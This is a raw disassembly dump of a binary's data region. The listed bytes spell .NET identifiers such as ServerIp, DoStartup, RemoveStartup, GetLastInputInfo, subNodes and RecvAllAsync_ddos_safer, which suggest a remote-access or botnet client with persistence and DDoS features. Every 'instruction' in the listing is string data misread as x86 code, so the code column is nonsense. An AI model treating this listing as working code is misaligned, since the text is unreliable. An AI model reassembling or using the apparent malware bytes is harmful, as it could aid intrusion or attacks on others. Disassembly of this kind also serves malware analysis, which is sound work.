  40a3ba:	6e                   	outsb  %ds:(%esi),(%dx)
  40a3bb:	66 6f                	outsw  %ds:(%esi),(%dx)
  40a3bd:	00 67 65             	add    %ah,0x65(%edi)
  40a3c0:	74 5f                	je     0x40a421
  40a3c2:	53                   	push   %ebx
  40a3c3:	74 61                	je     0x40a426
  40a3c5:	72 74                	jb     0x40a43b
  40a3c7:	49                   	dec    %ecx
  40a3c8:	6e                   	outsb  %ds:(%esi),(%dx)
  40a3c9:	66 6f                	outsw  %ds:(%esi),(%dx)
  40a3cb:	00 50 72             	add    %dl,0x72(%eax)
  40a3ce:	6f                   	outsl  %ds:(%esi),(%dx)
  40a3cf:	63 65 73             	arpl   %esp,0x73(%ebp)
  40a3d2:	73 53                	jae    0x40a427
  40a3d4:	74 61                	je     0x40a437
  40a3d6:	72 74                	jb     0x40a44c
  40a3d8:	49                   	dec    %ecx
  40a3d9:	6e                   	outsb  %ds:(%esi),(%dx)
  40a3da:	66 6f                	outsw  %ds:(%esi),(%dx)
  40a3dc:	00 47 65             	add    %al,0x65(%edi)
  40a3df:	74 4c                	je     0x40a42d
  40a3e1:	61                   	popa
  40a3e2:	73 74                	jae    0x40a458
  40a3e4:	49                   	dec    %ecx
  40a3e5:	6e                   	outsb  %ds:(%esi),(%dx)
  40a3e6:	70 75                	jo     0x40a45d
  40a3e8:	74 49                	je     0x40a433
  40a3ea:	6e                   	outsb  %ds:(%esi),(%dx)
  40a3eb:	66 6f                	outsw  %ds:(%esi),(%dx)
  40a3ed:	00 44 69 72          	add    %al,0x72(%ecx,%ebp,2)
  40a3f1:	65 63 74 6f 72       	arpl   %esi,%gs:0x72(%edi,%ebp,2)
  40a3f6:	79 49                	jns    0x40a441
  40a3f8:	6e                   	outsb  %ds:(%esi),(%dx)
  40a3f9:	66 6f                	outsw  %ds:(%esi),(%dx)
  40a3fb:	00 53 65             	add    %dl,0x65(%ebx)
  40a3fe:	72 76                	jb     0x40a476
  40a400:	65 72 49             	gs jb  0x40a44c
  40a403:	70 00                	jo     0x40a405
  40a405:	53                   	push   %ebx
  40a406:	6c                   	insb   (%dx),%es:(%edi)
  40a407:	65 65 70 00          	gs gs jo 0x40a40b
  40a40b:	53                   	push   %ebx
  40a40c:	6b 69 70 00          	imul   $0x0,0x70(%ecx),%ebp
  40a410:	6d                   	insl   (%dx),%es:(%edi)
  40a411:	65 6d                	gs insl (%dx),%es:(%edi)
  40a413:	63 6d 70             	arpl   %ebp,0x70(%ebp)
  40a416:	00 52 65             	add    %dl,0x65(%edx)
  40a419:	6d                   	insl   (%dx),%es:(%edi)
  40a41a:	6f                   	outsl  %ds:(%esi),(%dx)
  40a41b:	76 65                	jbe    0x40a482
  40a41d:	53                   	push   %ebx
  40a41e:	74 61                	je     0x40a481
  40a420:	72 74                	jb     0x40a496
  40a422:	75 70                	jne    0x40a494
  40a424:	00 44 6f 53          	add    %al,0x53(%edi,%ebp,2)
  40a428:	74 61                	je     0x40a48b
  40a42a:	72 74                	jb     0x40a4a0
  40a42c:	75 70                	jne    0x40a49e
  40a42e:	00 53 79             	add    %dl,0x79(%ebx)
  40a431:	73 74                	jae    0x40a4a7
  40a433:	65 6d                	gs insl (%dx),%es:(%edi)
  40a435:	2e 4c                	cs dec %esp
  40a437:	69 6e 71 00 43 6c 65 	imul   $0x656c4300,0x71(%esi),%ebp
  40a43e:	61                   	popa
  40a43f:	72 00                	jb     0x40a441
  40a441:	43                   	inc    %ebx
  40a442:	68 61 72 00 50       	push   $0x50007261
  40a447:	61                   	popa
  40a448:	72 73                	jb     0x40a4bd
  40a44a:	65 48                	gs dec %eax
  40a44c:	65 61                	gs popa
  40a44e:	64 65 72 00          	fs gs jb 0x40a452
  40a452:	53                   	push   %ebx
  40a453:	74 72                	je     0x40a4c7
  40a455:	65 61                	gs popa
  40a457:	6d                   	insl   (%dx),%es:(%edi)
  40a458:	52                   	push   %edx
  40a459:	65 61                	gs popa
  40a45b:	64 65 72 00          	fs gs jb 0x40a45f
  40a45f:	54                   	push   %esp
  40a460:	65 78 74             	gs js  0x40a4d7
  40a463:	52                   	push   %edx
  40a464:	65 61                	gs popa
  40a466:	64 65 72 00          	fs gs jb 0x40a46a
  40a46a:	68 65 61 64 65       	push   $0x65646165
  40a46f:	72 00                	jb     0x40a471
  40a471:	4d                   	dec    %ebp
  40a472:	44                   	inc    %esp
  40a473:	35 43 72 79 70       	xor    $0x70797243,%eax
  40a478:	74 6f                	je     0x40a4e9
  40a47a:	53                   	push   %ebx
  40a47b:	65 72 76             	gs jb  0x40a4f4
  40a47e:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  40a485:	69 64 65 72 00 41 73 	imul   $0x79734100,0x72(%ebp,%eiz,2),%esp
  40a48c:	79 
  40a48d:	6e                   	outsb  %ds:(%esi),(%dx)
  40a48e:	63 56 6f             	arpl   %edx,0x6f(%esi)
  40a491:	69 64 4d 65 74 68 6f 	imul   $0x646f6874,0x65(%ebp,%ecx,2),%esp
  40a498:	64 
  40a499:	42                   	inc    %edx
  40a49a:	75 69                	jne    0x40a505
  40a49c:	6c                   	insb   (%dx),%es:(%edi)
  40a49d:	64 65 72 00          	fs gs jb 0x40a4a1
  40a4a1:	41                   	inc    %ecx
  40a4a2:	73 79                	jae    0x40a51d
  40a4a4:	6e                   	outsb  %ds:(%esi),(%dx)
  40a4a5:	63 54 61 73          	arpl   %edx,0x73(%ecx,%eiz,2)
  40a4a9:	6b 4d 65 74          	imul   $0x74,0x65(%ebp),%ecx
  40a4ad:	68 6f 64 42 75       	push   $0x7542646f
  40a4b2:	69 6c 64 65 72 00 53 	imul   $0x74530072,0x65(%esp,%eiz,2),%ebp
  40a4b9:	74 
  40a4ba:	72 69                	jb     0x40a525
  40a4bc:	6e                   	outsb  %ds:(%esi),(%dx)
  40a4bd:	67 42                	addr16 inc %edx
  40a4bf:	75 69                	jne    0x40a52a
  40a4c1:	6c                   	insb   (%dx),%es:(%edi)
  40a4c2:	64 65 72 00          	fs gs jb 0x40a4c6
  40a4c6:	3c 3e                	cmp    $0x3e,%al
  40a4c8:	74 5f                	je     0x40a529
  40a4ca:	5f                   	pop    %edi
  40a4cb:	62 75 69             	bound  %esi,0x69(%ebp)
  40a4ce:	6c                   	insb   (%dx),%es:(%edi)
  40a4cf:	64 65 72 00          	fs gs jb 0x40a4d3
  40a4d3:	73 65                	jae    0x40a53a
  40a4d5:	6e                   	outsb  %ds:(%esi),(%dx)
  40a4d6:	64 65 72 00          	fs gs jb 0x40a4da
  40a4da:	52                   	push   %edx
  40a4db:	65 63 76 41          	arpl   %esi,%gs:0x41(%esi)
  40a4df:	6c                   	insb   (%dx),%es:(%edi)
  40a4e0:	6c                   	insb   (%dx),%es:(%edi)
  40a4e1:	41                   	inc    %ecx
  40a4e2:	73 79                	jae    0x40a55d
  40a4e4:	6e                   	outsb  %ds:(%esi),(%dx)
  40a4e5:	63 5f 64             	arpl   %ebx,0x64(%edi)
  40a4e8:	64 6f                	outsl  %fs:(%esi),(%dx)
  40a4ea:	73 5f                	jae    0x40a54b
  40a4ec:	73 61                	jae    0x40a54f
  40a4ee:	66 65 72 00          	data16 gs jb 0x40a4f2
  40a4f2:	52                   	push   %edx
  40a4f3:	65 63 76 41          	arpl   %esi,%gs:0x41(%esi)
  40a4f7:	6c                   	insb   (%dx),%es:(%edi)
  40a4f8:	6c                   	insb   (%dx),%es:(%edi)
  40a4f9:	41                   	inc    %ecx
  40a4fa:	73 79                	jae    0x40a575
  40a4fc:	6e                   	outsb  %ds:(%esi),(%dx)
  40a4fd:	63 5f 64             	arpl   %ebx,0x64(%edi)
  40a500:	64 6f                	outsl  %fs:(%esi),(%dx)
  40a502:	73 5f                	jae    0x40a563
  40a504:	75 6e                	jne    0x40a574
  40a506:	73 61                	jae    0x40a569
  40a508:	66 65 72 00          	data16 gs jb 0x40a50c
  40a50c:	43                   	inc    %ebx
  40a50d:	6f                   	outsl  %ds:(%esi),(%dx)
  40a50e:	6d                   	insl   (%dx),%es:(%edi)
  40a50f:	70 72                	jo     0x40a583
  40a511:	65 73 73             	gs jae 0x40a587
  40a514:	65 64 42             	gs fs inc %edx
  40a517:	75 66                	jne    0x40a57f
  40a519:	66 65 72 00          	data16 gs jb 0x40a51d
  40a51d:	55                   	push   %ebp
  40a51e:	6e                   	outsb  %ds:(%esi),(%dx)
  40a51f:	63 6f 6d             	arpl   %ebp,0x6d(%edi)
  40a522:	70 72                	jo     0x40a596
  40a524:	65 73 73             	gs jae 0x40a59a
  40a527:	65 64 42             	gs fs inc %edx
  40a52a:	75 66                	jne    0x40a592
  40a52c:	66 65 72 00          	data16 gs jb 0x40a530
  40a530:	57                   	push   %edi
  40a531:	6f                   	outsl  %ds:(%esi),(%dx)
  40a532:	72 6b                	jb     0x40a59f
  40a534:	73 70                	jae    0x40a5a6
  40a536:	61                   	popa
  40a537:	63 65 42             	arpl   %esp,0x42(%ebp)
  40a53a:	75 66                	jne    0x40a5a2
  40a53c:	66 65 72 00          	data16 gs jb 0x40a540
  40a540:	53                   	push   %ebx
  40a541:	6f                   	outsl  %ds:(%esi),(%dx)
  40a542:	75 72                	jne    0x40a5b6
  40a544:	63 65 42             	arpl   %esp,0x42(%ebp)
  40a547:	75 66                	jne    0x40a5af
  40a549:	66 65 72 00          	data16 gs jb 0x40a54d
  40a54d:	44                   	inc    %esp
  40a54e:	65 73 74             	gs jae 0x40a5c5
  40a551:	69 6e 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%esi),%ebp
  40a558:	42                   	inc    %edx
  40a559:	75 66                	jne    0x40a5c1
  40a55b:	66 65 72 00          	data16 gs jb 0x40a55f
  40a55f:	52                   	push   %edx
  40a560:	74 6c                	je     0x40a5ce
  40a562:	43                   	inc    %ebx
  40a563:	6f                   	outsl  %ds:(%esi),(%dx)
  40a564:	6d                   	insl   (%dx),%es:(%edi)
  40a565:	70 72                	jo     0x40a5d9
  40a567:	65 73 73             	gs jae 0x40a5dd
  40a56a:	42                   	inc    %edx
  40a56b:	75 66                	jne    0x40a5d3
  40a56d:	66 65 72 00          	data16 gs jb 0x40a571
  40a571:	52                   	push   %edx
  40a572:	74 6c                	je     0x40a5e0
  40a574:	44                   	inc    %esp
  40a575:	65 63 6f 6d          	arpl   %ebp,%gs:0x6d(%edi)
  40a579:	70 72                	jo     0x40a5ed
  40a57b:	65 73 73             	gs jae 0x40a5f1
  40a57e:	42                   	inc    %edx
  40a57f:	75 66                	jne    0x40a5e7
  40a581:	66 65 72 00          	data16 gs jb 0x40a585
  40a585:	62 75 66             	bound  %esi,0x66(%ebp)
  40a588:	66 65 72 00          	data16 gs jb 0x40a58c
  40a58c:	4d                   	dec    %ebp
  40a58d:	61                   	popa
  40a58e:	6e                   	outsb  %ds:(%esi),(%dx)
  40a58f:	61                   	popa
  40a590:	67 65 6d             	gs insl (%dx),%es:(%di)
  40a593:	65 6e                	outsb  %gs:(%esi),(%dx)
  40a595:	74 4f                	je     0x40a5e6
  40a597:	62 6a 65             	bound  %ebp,0x65(%edx)
  40a59a:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  40a59e:	61                   	popa
  40a59f:	72 63                	jb     0x40a604
  40a5a1:	68 65 72 00 44       	push   $0x44007265
  40a5a6:	6c                   	insb   (%dx),%es:(%edi)
  40a5a7:	6c                   	insb   (%dx),%es:(%edi)
  40a5a8:	4e                   	dec    %esi
  40a5a9:	6f                   	outsl  %ds:(%esi),(%dx)
  40a5aa:	64 65 48             	fs gs dec %eax
  40a5ad:	61                   	popa
  40a5ae:	6e                   	outsb  %ds:(%esi),(%dx)
  40a5af:	64 6c                	fs insb (%dx),%es:(%edi)
  40a5b1:	65 72 00             	gs jb  0x40a5b4
  40a5b4:	44                   	inc    %esp
  40a5b5:	6c                   	insb   (%dx),%es:(%edi)
  40a5b6:	6c                   	insb   (%dx),%es:(%edi)
  40a5b7:	48                   	dec    %eax
  40a5b8:	61                   	popa
  40a5b9:	6e                   	outsb  %ds:(%esi),(%dx)
  40a5ba:	64 6c                	fs insb (%dx),%es:(%edi)
  40a5bc:	65 72 00             	gs jb  0x40a5bf
  40a5bf:	53                   	push   %ebx
  40a5c0:	6f                   	outsl  %ds:(%esi),(%dx)
  40a5c1:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40a5c4:	74 48                	je     0x40a60e
  40a5c6:	61                   	popa
  40a5c7:	6e                   	outsb  %ds:(%esi),(%dx)
  40a5c8:	64 6c                	fs insb (%dx),%es:(%edi)
  40a5ca:	65 72 00             	gs jb  0x40a5cd
  40a5cd:	52                   	push   %edx
  40a5ce:	65 73 6f             	gs jae 0x40a640
  40a5d1:	6c                   	insb   (%dx),%es:(%edi)
  40a5d2:	76 65                	jbe    0x40a639
  40a5d4:	45                   	inc    %ebp
  40a5d5:	76 65                	jbe    0x40a63c
  40a5d7:	6e                   	outsb  %ds:(%esi),(%dx)
  40a5d8:	74 48                	je     0x40a622
  40a5da:	61                   	popa
  40a5db:	6e                   	outsb  %ds:(%esi),(%dx)
  40a5dc:	64 6c                	fs insb (%dx),%es:(%edi)
  40a5de:	65 72 00             	gs jb  0x40a5e1
  40a5e1:	55                   	push   %ebp
  40a5e2:	6e                   	outsb  %ds:(%esi),(%dx)
  40a5e3:	68 61 6e 64 6c       	push   $0x6c646e61
  40a5e8:	65 64 45             	gs fs inc %ebp
  40a5eb:	78 63                	js     0x40a650
  40a5ed:	65 70 74             	gs jo  0x40a664
  40a5f0:	69 6f 6e 45 76 65 6e 	imul   $0x6e657645,0x6e(%edi),%ebp
  40a5f7:	74 48                	je     0x40a641
  40a5f9:	61                   	popa
  40a5fa:	6e                   	outsb  %ds:(%esi),(%dx)
  40a5fb:	64 6c                	fs insb (%dx),%es:(%edi)
  40a5fd:	65 72 00             	gs jb  0x40a600
  40a600:	5f                   	pop    %edi
  40a601:	64 6c                	fs insb (%dx),%es:(%edi)
  40a603:	6c                   	insb   (%dx),%es:(%edi)
  40a604:	68 61 6e 64 6c       	push   $0x6c646e61
  40a609:	65 72 00             	gs jb  0x40a60c
  40a60c:	54                   	push   %esp
  40a60d:	6f                   	outsl  %ds:(%esi),(%dx)
  40a60e:	55                   	push   %ebp
  40a60f:	70 70                	jo     0x40a681
  40a611:	65 72 00             	gs jb  0x40a614
  40a614:	54                   	push   %esp
  40a615:	61                   	popa
  40a616:	73 6b                	jae    0x40a683
  40a618:	41                   	inc    %ecx
  40a619:	77 61                	ja     0x40a67c
  40a61b:	69 74 65 72 00 47 65 	imul   $0x74654700,0x72(%ebp,%eiz,2),%esi
  40a622:	74 
  40a623:	41                   	inc    %ecx
  40a624:	77 61                	ja     0x40a687
  40a626:	69 74 65 72 00 43 61 	imul   $0x70614300,0x72(%ebp,%eiz,2),%esi
  40a62d:	70 
  40a62e:	74 75                	je     0x40a6a5
  40a630:	72 69                	jb     0x40a69b
  40a632:	6e                   	outsb  %ds:(%esi),(%dx)
  40a633:	67 43                	addr16 inc %ebx
  40a635:	6f                   	outsl  %ds:(%esi),(%dx)
  40a636:	6e                   	outsb  %ds:(%esi),(%dx)
  40a637:	73 6f                	jae    0x40a6a8
  40a639:	6c                   	insb   (%dx),%es:(%edi)
  40a63a:	65 57                	gs push %edi
  40a63c:	72 69                	jb     0x40a6a7
  40a63e:	74 65                	je     0x40a6a5
  40a640:	72 00                	jb     0x40a642
  40a642:	54                   	push   %esp
  40a643:	65 78 74             	gs js  0x40a6ba
  40a646:	57                   	push   %edi
  40a647:	72 69                	jb     0x40a6b2
  40a649:	74 65                	je     0x40a6b0
  40a64b:	72 00                	jb     0x40a64d
  40a64d:	42                   	inc    %edx
  40a64e:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  40a655:	72 
  40a656:	74 65                	je     0x40a6bd
  40a658:	72 00                	jb     0x40a65a
  40a65a:	73 75                	jae    0x40a6d1
  40a65c:	62 53 65             	bound  %edx,0x65(%ebx)
  40a65f:	72 76                	jb     0x40a6d7
  40a661:	65 72 00             	gs jb  0x40a664
  40a664:	4d                   	dec    %ebp
  40a665:	61                   	popa
  40a666:	6e                   	outsb  %ds:(%esi),(%dx)
  40a667:	61                   	popa
  40a668:	67 65 6d             	gs insl (%dx),%es:(%di)
  40a66b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40a66d:	74 4f                	je     0x40a6be
  40a66f:	62 6a 65             	bound  %ebp,0x65(%edx)
  40a672:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  40a676:	75 6d                	jne    0x40a6e5
  40a678:	65 72 61             	gs jb  0x40a6dc
  40a67b:	74 6f                	je     0x40a6ec
  40a67d:	72 00                	jb     0x40a67f
  40a67f:	47                   	inc    %edi
  40a680:	65 74 45             	gs je  0x40a6c8
  40a683:	6e                   	outsb  %ds:(%esi),(%dx)
  40a684:	75 6d                	jne    0x40a6f3
  40a686:	65 72 61             	gs jb  0x40a6ea
  40a689:	74 6f                	je     0x40a6fa
  40a68b:	72 00                	jb     0x40a68d
  40a68d:	41                   	inc    %ecx
  40a68e:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  40a692:	61                   	popa
  40a693:	74 6f                	je     0x40a704
  40a695:	72 00                	jb     0x40a697
  40a697:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  40a69c:	00 2e                	add    %ch,(%esi)
  40a69e:	63 63 74             	arpl   %esp,0x74(%ebx)
  40a6a1:	6f                   	outsl  %ds:(%esi),(%dx)
  40a6a2:	72 00                	jb     0x40a6a4
  40a6a4:	43                   	inc    %ebx
  40a6a5:	72 65                	jb     0x40a70c
  40a6a7:	61                   	popa
  40a6a8:	74 65                	je     0x40a70f
  40a6aa:	44                   	inc    %esp
  40a6ab:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  40a6af:	70 74                	jo     0x40a725
  40a6b1:	6f                   	outsl  %ds:(%esi),(%dx)
  40a6b2:	72 00                	jb     0x40a6b4
  40a6b4:	43                   	inc    %ebx
  40a6b5:	72 65                	jb     0x40a71c
  40a6b7:	61                   	popa
  40a6b8:	74 65                	je     0x40a71f
  40a6ba:	45                   	inc    %ebp
  40a6bb:	6e                   	outsb  %ds:(%esi),(%dx)
  40a6bc:	63 72 79             	arpl   %esi,0x79(%edx)
  40a6bf:	70 74                	jo     0x40a735
  40a6c1:	6f                   	outsl  %ds:(%esi),(%dx)
  40a6c2:	72 00                	jb     0x40a6c4
  40a6c4:	49                   	dec    %ecx
  40a6c5:	6e                   	outsb  %ds:(%esi),(%dx)
  40a6c6:	74 50                	je     0x40a718
  40a6c8:	74 72                	je     0x40a73c
  40a6ca:	00 53 79             	add    %dl,0x79(%ebx)
  40a6cd:	73 74                	jae    0x40a743
  40a6cf:	65 6d                	gs insl (%dx),%es:(%edi)
  40a6d1:	2e 44                	cs inc %esp
  40a6d3:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  40a6da:	69 63 73 00 67 65 74 	imul   $0x74656700,0x73(%ebx),%esp
  40a6e1:	5f                   	pop    %edi
  40a6e2:	54                   	push   %esp
  40a6e3:	6f                   	outsl  %ds:(%esi),(%dx)
  40a6e4:	74 61                	je     0x40a747
  40a6e6:	6c                   	insb   (%dx),%es:(%edi)
  40a6e7:	4d                   	dec    %ebp
  40a6e8:	69 6c 6c 69 73 65 63 	imul   $0x6f636573,0x69(%esp,%ebp,2),%ebp
  40a6ef:	6f 
  40a6f0:	6e                   	outsb  %ds:(%esi),(%dx)
  40a6f1:	64 73 00             	fs jae 0x40a6f4
  40a6f4:	41                   	inc    %ecx
  40a6f5:	65 73 00             	gs jae 0x40a6f8
  40a6f8:	53                   	push   %ebx
  40a6f9:	79 73                	jns    0x40a76e
  40a6fb:	74 65                	je     0x40a762
  40a6fd:	6d                   	insl   (%dx),%es:(%edi)
  40a6fe:	2e 52                	cs push %edx
  40a700:	75 6e                	jne    0x40a770
  40a702:	74 69                	je     0x40a76d
  40a704:	6d                   	insl   (%dx),%es:(%edi)
  40a705:	65 2e 49             	gs cs dec %ecx
  40a708:	6e                   	outsb  %ds:(%esi),(%dx)
  40a709:	74 65                	je     0x40a770
  40a70b:	72 6f                	jb     0x40a77c
  40a70d:	70 53                	jo     0x40a762
  40a70f:	65 72 76             	gs jb  0x40a788
  40a712:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  40a719:	73 74                	jae    0x40a78f
  40a71b:	65 6d                	gs insl (%dx),%es:(%edi)
  40a71d:	2e 52                	cs push %edx
  40a71f:	75 6e                	jne    0x40a78f
  40a721:	74 69                	je     0x40a78c
  40a723:	6d                   	insl   (%dx),%es:(%edi)
  40a724:	65 2e 43             	gs cs inc %ebx
  40a727:	6f                   	outsl  %ds:(%esi),(%dx)
  40a728:	6d                   	insl   (%dx),%es:(%edi)
  40a729:	70 69                	jo     0x40a794
  40a72b:	6c                   	insb   (%dx),%es:(%edi)
  40a72c:	65 72 53             	gs jb  0x40a782
  40a72f:	65 72 76             	gs jb  0x40a7a8
  40a732:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  40a739:	62 75 67             	bound  %esi,0x67(%ebp)
  40a73c:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  40a743:	65 
  40a744:	73 00                	jae    0x40a746
  40a746:	73 75                	jae    0x40a7bd
  40a748:	62 4e 6f             	bound  %ecx,0x6f(%esi)
  40a74b:	64 65 73 00          	fs gs jae 0x40a74f
  40a74f:	41                   	inc    %ecx
  40a750:	73 73                	jae    0x40a7c5
  40a752:	65 6d                	gs insl (%dx),%es:(%edi)
  40a754:	62 6c 69 65          	bound  %ebp,0x65(%ecx,%ebp,2)
  40a758:	73 00                	jae    0x40a75a
  40a75a:	45                   	inc    %ebp
  40a75b:	78 70                	js     0x40a7cd
  40a75d:	61                   	popa
  40a75e:	6e                   	outsb  %ds:(%esi),(%dx)
  40a75f:	64 45                	fs inc %ebp
  40a761:	6e                   	outsb  %ds:(%esi),(%dx)
  40a762:	76 69                	jbe    0x40a7cd
  40a764:	72 6f                	jb     0x40a7d5
  40a766:	6e                   	outsb  %ds:(%esi),(%dx)
  40a767:	6d                   	insl   (%dx),%es:(%edi)
  40a768:	65 6e                	outsb  %gs:(%esi),(%dx)
  40a76a:	74 56                	je     0x40a7c2
  40a76c:	61                   	popa
  40a76d:	72 69                	jb     0x40a7d8
  40a76f:	61                   	popa
  40a770:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  40a774:	00 47 65             	add    %al,0x65(%edi)
  40a777:	74 56                	je     0x40a7cf
  40a779:	61                   	popa
  40a77a:	6c                   	insb   (%dx),%es:(%edi)
  40a77b:	75 65                	jne    0x40a7e2
  40a77d:	4e                   	dec    %esi
  40a77e:	61                   	popa
  40a77f:	6d                   	insl   (%dx),%es:(%edi)
  40a780:	65 73 00             	gs jae 0x40a783
  40a783:	49                   	dec    %ecx
  40a784:	6e                   	outsb  %ds:(%esi),(%dx)
  40a785:	74 54                	je     0x40a7db
  40a787:	6f                   	outsl  %ds:(%esi),(%dx)
  40a788:	42                   	inc    %edx
  40a789:	79 74                	jns    0x40a7ff
  40a78b:	65 73 00             	gs jae 0x40a78e
  40a78e:	47                   	inc    %edi
  40a78f:	65 74 42             	gs je  0x40a7d4
  40a792:	79 74                	jns    0x40a808
  40a794:	65 73 00             	gs jae 0x40a797
  40a797:	73 69                	jae    0x40a802
  40a799:	7a 65                	jp     0x40a800
  40a79b:	74 64                	je     0x40a801
  40a79d:	77 42                	ja     0x40a7e1
  40a79f:	79 74                	jns    0x40a815
  40a7a1:	65 73 00             	gs jae 0x40a7a4
  40a7a4:	62 79 74             	bound  %edi,0x74(%ecx)
  40a7a7:	65 73 00             	gs jae 0x40a7aa
  40a7aa:	42                   	inc    %edx
  40a7ab:	69 6e 64 69 6e 67 46 	imul   $0x46676e69,0x64(%esi),%ebp
  40a7b2:	6c                   	insb   (%dx),%es:(%edi)
  40a7b3:	61                   	popa
  40a7b4:	67 73 00             	addr16 jae 0x40a7b7
  40a7b7:	53                   	push   %ebx
  40a7b8:	6f                   	outsl  %ds:(%esi),(%dx)
  40a7b9:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40a7bc:	74 46                	je     0x40a804
  40a7be:	6c                   	insb   (%dx),%es:(%edi)
  40a7bf:	61                   	popa
  40a7c0:	67 73 00             	addr16 jae 0x40a7c3
  40a7c3:	75 46                	jne    0x40a80b
  40a7c5:	6c                   	insb   (%dx),%es:(%edi)
  40a7c6:	61                   	popa
  40a7c7:	67 73 00             	addr16 jae 0x40a7ca
  40a7ca:	52                   	push   %edx
  40a7cb:	65 73 6f             	gs jae 0x40a83d
  40a7ce:	6c                   	insb   (%dx),%es:(%edi)
  40a7cf:	76 65                	jbe    0x40a836
  40a7d1:	45                   	inc    %ebp
  40a7d2:	76 65                	jbe    0x40a839
  40a7d4:	6e                   	outsb  %ds:(%esi),(%dx)
  40a7d5:	74 41                	je     0x40a818
  40a7d7:	72 67                	jb     0x40a840
  40a7d9:	73 00                	jae    0x40a7db
  40a7db:	55                   	push   %ebp
  40a7dc:	6e                   	outsb  %ds:(%esi),(%dx)
  40a7dd:	68 61 6e 64 6c       	push   $0x6c646e61
  40a7e2:	65 64 45             	gs fs inc %ebp
  40a7e5:	78 63                	js     0x40a84a
  40a7e7:	65 70 74             	gs jo  0x40a85e
  40a7ea:	69 6f 6e 45 76 65 6e 	imul   $0x6e657645,0x6e(%edi),%ebp
  40a7f1:	74 41                	je     0x40a834
  40a7f3:	72 67                	jb     0x40a85c
  40a7f5:	73 00                	jae    0x40a7f7
  40a7f7:	61                   	popa
  40a7f8:	72 67                	jb     0x40a861
  40a7fa:	73 00                	jae    0x40a7fc
  40a7fc:	3c 3e                	cmp    $0x3e,%al
  40a7fe:	34 5f                	xor    $0x5f,%al
  40a800:	5f                   	pop    %edi
  40a801:	74 68                	je     0x40a86b
  40a803:	69 73 00 53 79 73 74 	imul   $0x74737953,0x0(%ebx),%esi
  40a80a:	65 6d                	gs insl (%dx),%es:(%edi)
  40a80c:	2e 54                	cs push %esp
  40a80e:	68 72 65 61 64       	push   $0x64616572
  40a813:	69 6e 67 2e 54 61 73 	imul   $0x7361542e,0x67(%esi),%ebp
  40a81a:	6b 73 00 55          	imul   $0x55,0x0(%ebx),%esi
  40a81e:	74 69                	je     0x40a889
  40a820:	6c                   	insb   (%dx),%es:(%edi)
  40a821:	73 00                	jae    0x40a823
  40a823:	53                   	push   %ebx
  40a824:	79 73                	jns    0x40a899
  40a826:	74 65                	je     0x40a88d
  40a828:	6d                   	insl   (%dx),%es:(%edi)
  40a829:	2e 53                	cs push %ebx
  40a82b:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  40a82f:	69 74 79 2e 43 6c 61 	imul   $0x69616c43,0x2e(%ecx,%edi,2),%esi
  40a836:	69 
  40a837:	6d                   	insl   (%dx),%es:(%edi)
  40a838:	73 00                	jae    0x40a83a
  40a83a:	43                   	inc    %ebx
  40a83b:	6f                   	outsl  %ds:(%esi),(%dx)
  40a83c:	6e                   	outsb  %ds:(%esi),(%dx)
  40a83d:	74 61                	je     0x40a8a0
  40a83f:	69 6e 73 00 53 6f 63 	imul   $0x636f5300,0x73(%esi),%ebp
  40a846:	6b 65 74 54          	imul   $0x54,0x74(%ebp),%esp
  40a84a:	61                   	popa
  40a84b:	73 6b                	jae    0x40a8b8
  40a84d:	45                   	inc    %ebp
  40a84e:	78 74                	js     0x40a8c4
  40a850:	65 6e                	outsb  %gs:(%esi),(%dx)
  40a852:	73 69                	jae    0x40a8bd
  40a854:	6f                   	outsl  %ds:(%esi),(%dx)
  40a855:	6e                   	outsb  %ds:(%esi),(%dx)
  40a856:	73 00                	jae    0x40a858
  40a858:	53                   	push   %ebx
  40a859:	74 72                	je     0x40a8cd
  40a85b:	69 6e 67 53 70 6c 69 	imul   $0x696c7053,0x67(%esi),%ebp
  40a862:	74 4f                	je     0x40a8b3
  40a864:	70 74                	jo     0x40a8da
  40a866:	69 6f 6e 73 00 52 75 	imul   $0x75520073,0x6e(%edi),%ebp
  40a86d:	6e                   	outsb  %ds:(%esi),(%dx)
  40a86e:	74 69                	je     0x40a8d9
  40a870:	6d                   	insl   (%dx),%es:(%edi)
  40a871:	65 48                	gs dec %eax
  40a873:	65 6c                	gs insb (%dx),%es:(%edi)
  40a875:	70 65                	jo     0x40a8dc
  40a877:	72 73                	jb     0x40a8ec
  40a879:	00 47 65             	add    %al,0x65(%edi)
  40a87c:	74 43                	je     0x40a8c1
  40a87e:	75 72                	jne    0x40a8f2
  40a880:	72 65                	jb     0x40a8e7
  40a882:	6e                   	outsb  %ds:(%esi),(%dx)
  40a883:	74 50                	je     0x40a8d5
  40a885:	72 6f                	jb     0x40a8f6
  40a887:	63 65 73             	arpl   %esp,0x73(%ebp)
  40a88a:	73 00                	jae    0x40a88c
  40a88c:	43                   	inc    %ebx
  40a88d:	6f                   	outsl  %ds:(%esi),(%dx)
  40a88e:	6d                   	insl   (%dx),%es:(%edi)
  40a88f:	70 72                	jo     0x40a903
  40a891:	65 73 73             	gs jae 0x40a907
  40a894:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
  40a898:	6f                   	outsl  %ds:(%esi),(%dx)
  40a899:	6d                   	insl   (%dx),%es:(%edi)
  40a89a:	70 72                	jo     0x40a90e
  40a89c:	65 73 73             	gs jae 0x40a912
  40a89f:	00 53 79             	add    %dl,0x79(%ebx)
  40a8a2:	73 74                	jae    0x40a918
  40a8a4:	65 6d                	gs insl (%dx),%es:(%edi)
